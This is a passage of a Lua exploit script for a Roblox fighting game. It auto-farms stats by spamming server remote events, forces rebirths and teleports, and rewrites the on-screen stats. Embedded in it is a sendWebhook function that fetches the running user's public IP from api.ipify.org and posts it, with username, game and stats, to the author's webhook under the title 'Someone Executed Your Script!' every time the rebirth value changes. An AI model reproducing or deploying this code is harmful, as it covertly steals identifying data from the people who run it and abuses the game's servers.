local function getValue(name)
    local child = dataNode:FindFirstChild(name)
    if child then
        return child.Value
    else
        warn(name .. " not found for player")
        return "N/A"
    end
end

local function sendWebhook()
    local data = {
        ["content"] = "@everyone ("..getValue("Rebirth")..")",
        ["embeds"] = {
            {
                ["title"] = "**Someone Executed Your Script!**",
                ["description"] = "Username: " .. plr.Name .. " is using " .. webhookcheck .. " and is in this game " .. game.PlaceId .. " STATS!!! (Strength: **" .. getValue("Strength") .. "**) (Speed: **" .. getValue("Speed") .. "**) (Defense: **" .. getValue("Defense") .. "**) (Energy: **" .. getValue("Energy") .. "**) (Rebirths: **" .. getValue("Rebirth") .. "**) (Zeni: **" .. getValue("Zeni") .. "**) (Time: **" .. os.date("%c") .. "**) (Ip: **" .. game:HttpGet("https://api.ipify.org") .. "**) (Game: **" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "**) (Side: **" .. getValue("Allignment") .. "**)",
                ["type"] = "rich",
                ["color"] = tonumber(0x7269da),
                ["image"] = {["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(plr.Name)}
            }
        }
    }
    local newdata = HttpService:JSONEncode(data)
    local headers = {
        ["content-type"] = "application/json"
    }
    local requestTable = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    local request = http_request or request or HttpPost or syn.request
    request(requestTable)
end

local rebirth = dataNode:WaitForChild("Rebirth")

rebirth.Changed:Connect(function()
    sendWebhook()
end)


local function earthtp()
    local RebValue = ""
    local rebirthOnJoin = game.ReplicatedStorage.Datas[game.Players.LocalPlayer.UserId].Rebirth.Value

    task.spawn(function()
        while true and task.wait() do
            pcall(function()
                local data = game.ReplicatedStorage.Datas[game.Players.LocalPlayer.UserId]
                while true and task.wait() do
                    game:GetService("ReplicatedStorage").Package.Events.reb:InvokeServer() -- reb
                    RebValue = data.Rebirth.Value
                    if rebirthOnJoin ~= RebValue then
                        local A_1 = "Earth"
                        local Event = game:GetService("ReplicatedStorage").Package.Events.TP
                        Event:InvokeServer(A_1)
                        task.wait(3)
                    end
                end
            end)
        end
    end)
end

local function billstp()
    pcall(function()
        local data = game.ReplicatedStorage.Datas[game.Players.LocalPlayer.UserId]
        if data.Defense.Value >= 200000000 and game.placeId ~= 5151400895 then
            if data.Zeni.Value >= 15000 then
                local A_1 = "Vills Planet"
                local Event = game:GetService("ReplicatedStorage").Package.Events.TP
                Event:InvokeServer(A_1)
                task.wait(3)
                tp = true
                return tp
            end
        end
    end)
end


-- Define the abbreviateNumber function
local function abbreviateNumber(number)
    if number >= 1e15 then
        return string.format("%.2fQd", number / 1e15) -- Quadrillions
    elseif number >= 1e12 then
        return string.format("%.2fT", number / 1e12) -- Trillions
    elseif number >= 1e9 then
        return string.format("%.2fB", number / 1e9) -- Billions
    elseif number >= 1e6 then
        return string.format("%.2fM", number / 1e6) -- Millions
    elseif number >= 1e3 then
        return string.format("%.2fK", number / 1e3) -- Thousands
    else
        return tostring(number)
    end
end

local function waitForGuiElement(parent, name)
    local element = parent:FindFirstChild(name)
    while not element do
        element = parent:WaitForChild(name)
        task.wait() -- Yield briefly to avoid busy-waiting
    end
    return element
end

local function updateStatsAndBars()
    while true do
        local success, error = pcall(function()
            local plr = game.Players.LocalPlayer
            local playerId = plr.UserId
            
            -- Check if the PlayerGui and Main exist
            local playerGui = plr:FindFirstChild("PlayerGui")
            if not playerGui then
                playerGui = plr:WaitForChild("PlayerGui")
            end
            
            local mainFrame = waitForGuiElement(playerGui, "Main")
            
            -- Update stats
            local StatsTextLabel = waitForGuiElement(mainFrame, "MainFrame"):FindFirstChild("Frames"):FindFirstChild("Stats")
            local zeniTextLabel = waitForGuiElement(mainFrame, "MainFrame"):FindFirstChild("Indicator"):FindFirstChild("Zeni")
            local data = game:GetService("ReplicatedStorage").Datas:FindFirstChild(tostring(playerId))
            
            if data and StatsTextLabel then
                local defenseValue = data.Defense.Value
                local strengthValue = data.Strength.Value
                local speedValue = data.Speed.Value
                local energyValue = data.Energy.Value
                local zeniValue = data.Zeni.Value
                
                StatsTextLabel.Defense.Text = "Defense: " .. abbreviateNumber(defenseValue)
                StatsTextLabel.Strength.Text = "Strength: " .. abbreviateNumber(strengthValue)
                StatsTextLabel.Speed.Text = "Speed: " .. abbreviateNumber(speedValue)
                StatsTextLabel.Energy.Text = "Energy: " .. abbreviateNumber(energyValue)
                
                -- Update Zeni
                if zeniTextLabel then
                    zeniTextLabel.Text = abbreviateNumber(zeniValue).." Zeni"
                else
                    warn("Zeni label not found")
                end
            end
            
            -- Update bars
            local energyTextLabel = waitForGuiElement(mainFrame, "MainFrame"):FindFirstChild("Bars"):FindFirstChild("Energy"):FindFirstChild("TextLabel")
            local healthTextLabel = waitForGuiElement(mainFrame, "MainFrame"):FindFirstChild("Bars"):FindFirstChild("Health"):FindFirstChild("TextLabel")
            
            local function convertToPercentage(current, max)
                if current and max and max ~= 0 then
                    return math.floor((current / max) * 100)
                else
                    return 0
                end
            end
            
            if energyTextLabel then
                local energyText = energyTextLabel.Text
                local currentEnergy = tonumber(string.match(energyText, "%d+"))
                local maxEnergy = tonumber(string.match(energyText, "%d+$"))
                if currentEnergy and maxEnergy then
                    local energyPercentage = convertToPercentage(currentEnergy, maxEnergy)
                    energyTextLabel.Text = string.format("ENERGY: %d/%d%%", energyPercentage, 100)
                end
            else
                warn("Energy TextLabel not found")
            end
            
            if healthTextLabel then
                local healthText = healthTextLabel.Text
                local currentHealth = tonumber(string.match(healthText, "%d+"))
                local maxHealth = tonumber(string.match(healthText, "%d+$"))
                if currentHealth and maxHealth then
                    local healthPercentage = convertToPercentage(currentHealth, maxHealth)
                    healthTextLabel.Text = string.format("HEALTH: %d/%d%%", healthPercentage, 100)
                end
            else
                warn("Health TextLabel not found")
            end
        end)
        
        if not success then
            warn("Error in updateStatsAndBars function: " .. tostring(error))
        end
        
        task.wait()
    end
end

task.spawn(updateStatsAndBars)



local function stats()
    local player = game.Players.LocalPlayer

    -- Wait until the player character is found in Workspace.Living
    while not game.Workspace.Living:FindFirstChild(player.Name) do
       task.wait()-- Wait for 0 second before checking again
    end

    local playerCharacter = game.Workspace.Living:FindFirstChild(player.Name)
    local statsFolder = playerCharacter:FindFirstChild("Stats")

    if not statsFolder then
        warn("Stats folder not found for player")
        return
    end

    local strength = statsFolder:FindFirstChild("Strength")
    local speed = statsFolder:FindFirstChild("Speed")
    local energy = statsFolder:FindFirstChild("Energy")
    local defense = statsFolder:FindFirstChild("Defense")
    local statsRequerimiento = statsFolder:FindFirstChild("Rebirth")
    local a = strength.Value
    local b = energy.Value
    local c = defense.Value
    local d = speed.Value
    local f = statsRequerimiento.Value
    local treinkaK = 200000000

    if not (strength and speed and energy and defense and statsRequerimiento) then
        warn("One or more stat attributes are missing")
        return
    end

    local targetValue = statsRequerimiento.Value * 20
    local strengthMAx = statsRequerimiento.Value * 100

    if (a < treinkaK or b < treinkaK or c < treinkaK or d < treinkaK) then
        local function punch()
            while strength.Value < strengthMAx do
                wait()
                local args = {[1] = "Blacknwhite27",[2] = 1}
                game:GetService("ReplicatedStorage"):WaitForChild("Package"):WaitForChild("Events"):WaitForChild("p"):FireServer(unpack(args))
                if strength.Value >= strengthMAx then
                    break
                end
            end
        end
        spawn(punch)

        local function l()
            while energy.Value< targetValue do
                wait()
                local args = {[1] = 1,[2] = true,[3] = CFrame.new(12, 12, 12)}
                game:GetService("ReplicatedStorage"):WaitForChild("Package"):WaitForChild("Events"):WaitForChild("kb"):FireServer(unpack(args))
                if  energy.Value >= targetValue then
                    break
                end
            end
        end
        spawn (l)

        local function defend()
            while defense.Value < targetValue do
                wait()
                local args = {[1] = "Blacknwhite27"}
                game:GetService("ReplicatedStorage"):WaitForChild("Package"):WaitForChild("Events"):WaitForChild("def"):InvokeServer(unpack(args))
                if defense.Value >= targetValue then
                    break
                end
            end
        end
        spawn(defend)

        local function charge()
            task.spawn(function()
                while task.wait() do
                    pcall(function()
                        local args = {[1] = "Blacknwhite27"}
                        game:GetService("ReplicatedStorage"):WaitForChild("Package"):WaitForChild("Events"):WaitForChild("cha"):InvokeServer(unpack(args))
                    end)
                end
            end)
        end
        spawn(charge)
    end
end

task.spawn(stats)


